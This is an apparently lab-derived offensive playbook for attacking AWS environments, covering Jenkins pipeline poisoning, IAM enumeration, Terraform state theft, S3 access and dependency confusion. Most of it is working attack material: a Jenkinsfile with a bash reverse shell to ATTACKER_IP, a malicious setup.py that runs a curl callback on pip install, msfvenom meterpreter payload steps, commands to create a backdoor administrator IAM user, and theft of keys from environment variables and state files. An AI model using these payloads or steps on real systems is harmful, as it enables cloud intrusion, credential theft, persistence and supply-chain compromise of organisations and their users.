# AWS Cloud Attack Techniques

Guide to attacking AWS cloud infrastructure, including CI/CD pipeline exploitation, IAM privilege escalation, S3 bucket attacks, dependency chain abuse, and Terraform state exploitation.

---

## CI/CD Security Risks (OWASP Reference)

| ID | Risk | Description |
|----|------|-------------|
| CICD-SEC-3 | Dependency Chain Abuse | Malicious package replacing internal dependency |
| CICD-SEC-4 | Poisoned Pipeline Execution | Attacker controls build/deploy script for RCE/secret theft |
| CICD-SEC-5 | Insufficient PBAC | Pipeline has excessive permissions; secrets not protected |
| CICD-SEC-6 | Insufficient Credential Hygiene | Weak controls on secrets/tokens leading to leaks |
| CICD-SEC-7 | Insecure System Configuration | Misconfiguration in pipeline infrastructure |
| CICD-SEC-9 | Improper Artifact Integrity | Malicious code injected without validation checks |

---

## Attack Flow 1: Leaked Secrets to Poisoned Pipeline

### Enumeration

**Jenkins Enumeration**
```bash
# Metasploit Jenkins scanner
use auxiliary/scanner/http/jenkins_enum
set RHOSTS <jenkins_host>
set TARGETURI /
run

# Directory bust for hidden endpoints
gobuster dir -u http://<jenkins_host> -w /usr/share/wordlists/dirb/common.txt
```

**Git Server Enumeration**
- Browse repositories and users
- Check for private vs public repos
- Note software version for exploit research
- Brute force users for weak passwords (e.g., hydra)

**Application Enumeration**
```bash
# View page source for S3 bucket URLs
curl -s http://<app_host> | grep -oP 'https://[a-zA-Z0-9.-]+\.s3\.[a-zA-Z0-9-]+\.amazonaws\.com[^"]*'

# Directory discovery
gobuster dir -u http://<app_host> -w /usr/share/wordlists/dirb/common.txt
```

**S3 Bucket Enumeration**
```bash
# List bucket (may return AccessDenied)
curl https://BUCKET.s3.region.amazonaws.com

# Directory bust bucket URL
dirb https://BUCKET.s3.us-east-1.amazonaws.com/ ./wordlist.txt

# Check for exposed .git
curl https://BUCKET.s3.us-east-1.amazonaws.com/.git/HEAD

# AWS CLI enumeration (with any valid credentials)
aws s3 ls BUCKET_NAME
aws s3 cp s3://BUCKET/README.md ./
aws s3 sync s3://BUCKET ./local_copy/
```

### Discovering Secrets

**Git History Analysis**
```bash
cd synced_repo
git log
git show <commit_hash>   # Look for "Fix issue" commits with removed secrets

# Decode base64 auth headers found in diffs
echo "BASE64_STRING" | base64 -d
# Output: username:password
```

**Secret Scanning**
```bash
sudo apt install -y gitleaks
gitleaks detect
```

**Common Secret Locations**
- Scripts with hardcoded credentials or API tokens
- Jenkinsfile with `withAWS(credentials:'key_name')`
- Bash history files
- Configuration files with Basic auth headers

### Pipeline Poisoning

**Jenkinsfile Reverse Shell**
```groovy
pipeline {
  agent any
  stages {
    stage('Exploitation') {
      steps {
        withAWS(region: 'us-east-1', credentials: 'aws_key') {
          script {
            if (isUnix()) {
              sh 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4242 0>&1" & '
            }
          }
        }
      }
    }
  }
}
```

**Listener**
```bash
nc -nvlp 4242
```

Commit the modified Jenkinsfile to trigger the webhook and receive a reverse shell on the build server.

### Builder Enumeration

```bash
# In reverse shell on builder
uname -a
cat /etc/os-release
whoami
env | grep AWS   # AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_DEFAULT_REGION
cat /proc/mounts  # overlay = Docker container
```

---

## IAM Exploitation

### Enumerate IAM Permissions

```bash
aws configure --profile=compromised
# Enter stolen AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY

aws --profile compromised sts get-caller-identity
aws --profile compromised iam list-user-policies --user-name <username>
aws --profile compromised iam list-attached-user-policies --user-name <username>
aws --profile compromised iam list-groups-for-user --user-name <username>
aws --profile compromised iam get-user-policy --user-name <username> --policy-name <policy>
# If policy shows "Action": "*", "Resource": "*" -> full admin
```

### Create Backdoor IAM User

```bash
aws --profile compromised iam create-user --user-name backdoor
aws --profile compromised iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws --profile compromised iam create-access-key --user-name backdoor
aws configure --profile=backdoor   # Use new AccessKeyId and SecretAccessKey
aws --profile backdoor iam list-attached-user-policies --user-name backdoor
```

### EC2 Enumeration

```bash
aws ec2 describe-instances
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,Tags]'
```

---

## Attack Flow 2: Dependency Chain Abuse

### Concepts

- **Dependency confusion**: Internal package name not on public index; attacker publishes same name with higher version
- **pip config**: `extra-index-url` is vulnerable (searches public + private; highest version wins)
- **Version specifiers**: `==` exact; `~=1.1.0` compatible (1.1.x); `>=`/`<=`; `*` wildcard
- Package name uses dashes (`my-package`); Python import uses underscores (`my_package`)

### Reconnaissance

```bash
# Check if package exists on public index
pip download target-package
# "No matching distribution" = internal-only = good candidate

# Look for OSINT: forum posts, documentation mentioning internal packages
# Check pip config files for extra-index-url usage
```

### Malicious Package Structure

```
target-package/
├── setup.py
└── target_package/
    ├── __init__.py
    └── utils.py
```

### Install-Time Execution (setup.py)

```python
from setuptools import setup, find_packages
from setuptools.command.install import install

class Installer(install):
    def run(self):
        install.run(self)
        # Payload executes during pip install
        import os; os.system('curl http://ATTACKER_IP/callback')

setup(
    name='target-package',
    version='1.1.4',
    packages=find_packages(),
    cmdclass={'install': Installer}
)
```

### Runtime Execution (utils.py)

```python
import time, sys

def standardFunction():
    pass

def __getattr__(name):
    return standardFunction

def catch_exception(exc_type, exc_value, tb):
    while True:
        time.sleep(1000)

sys.excepthook = catch_exception
# Payload (e.g., meterpreter) executes on import
```

### Build and Publish

```bash
python3 ./setup.py sdist
pip install dist/target_package-1.1.4.tar.gz  # Local test
pip uninstall target-package

# Upload to target package index
twine upload --repository-url http://<pypi_host>/ -u <user> -p <password> dist/*
```

### Meterpreter Handler

```bash
msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4488
# Paste exec(...) line into utils.py

msfconsole
use exploit/multi/handler
set payload python/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4488
set ExitOnSession false
run -jz
```

---

## Post-Exploitation: Container and Network Enumeration

### Container Enumeration

```bash
ifconfig
whoami
printenv   # Look for SECRET_KEY, credentials, database URIs, flags
mount      # overlay = Docker container
cat /etc/os-release
```

### Internal Network Scanning

```python
# Simple Python port scanner for use inside containers
import socket, ipaddress, sys
def port_scan(ip_range, ports):
    for ip in ip_range:
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(.2)
            if sock.connect_ex((str(ip), port)) == 0:
                print(f"Port {port} open on {ip}")
            sock.close()
ip_range = ipaddress.IPv4Network(sys.argv[1], strict=False)
ports = [80, 443, 8080]
port_scan(ip_range, ports)
```

```bash
python netscan.py 172.18.0.1/24
python netscan.py 172.30.0.1/24
```

### Tunneling to Internal Services

```bash
# SOCKS proxy via Meterpreter
background
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
run -j
route add 172.30.0.1 255.255.0.0 SESSION_ID

# SSH local forward from attacker machine
ssh -fN -L localhost:1080:localhost:1080 user@CLOUD_HOST

# Firefox: Manual proxy -> SOCKS Host 127.0.0.1, Port 1080, SOCKS v5
```

---

## Terraform State Exploitation

### Accessing Terraform State from S3

```bash
aws --profile stolen s3api list-buckets
# Look for tf-state-* buckets

aws --profile stolen s3 ls tf-state-BUCKET
aws --profile stolen s3 cp s3://tf-state-BUCKET/terraform.tfstate ./
cat terraform.tfstate
```

### Extracting Secrets from State

The Terraform state file contains:
- **user_list**: Usernames and their associated AWS policies
- **resources**: IAM access key IDs and secrets in plaintext

```bash
# Configure admin profile from extracted keys
aws configure --profile=admin_user
aws --profile=admin_user iam list-attached-user-policies --user-name <admin_user>
# AdministratorAccess = full compromise
```

---

## Quick Reference

| Task | Command |
|------|---------|
| S3 list | `aws s3 ls BUCKET` |
| S3 sync | `aws s3 sync s3://BUCKET ./local_dir/` |
| Caller identity | `aws sts get-caller-identity` |
| User policies | `aws iam list-user-policies --user-name USER` |
| Backdoor user | `aws iam create-user` + `attach-user-policy` + `create-access-key` |
| Git history secrets | `git log` then `git show COMMIT` |
| Decode Basic auth | `echo "BASE64" \| base64 -d` |
| Build Python package | `python3 setup.py sdist` |
| Upload package | `twine upload --repository-url URL -u U -p P dist/*` |
| SOCKS proxy + route | `auxiliary/server/socks_proxy` + `route add NET MASK SID` |
| SSH tunnel | `ssh -fN -L 1080:localhost:1080 user@HOST` |

---

## MITRE ATT&CK Mapping

| Technique | ID | Context |
|-----------|-----|---------|
| Create Cloud Account | T1136.003 | Backdoor IAM user |
| Supply Chain Compromise | T1195.002 | Dependency confusion |
| Valid Accounts: Cloud | T1078.004 | Stolen AWS keys |
| Unsecured Credentials | T1552.005 | Terraform state |
| Data from Cloud Storage | T1530 | S3 bucket access |
| Cloud Infrastructure Discovery | T1580 | EC2 enumeration |
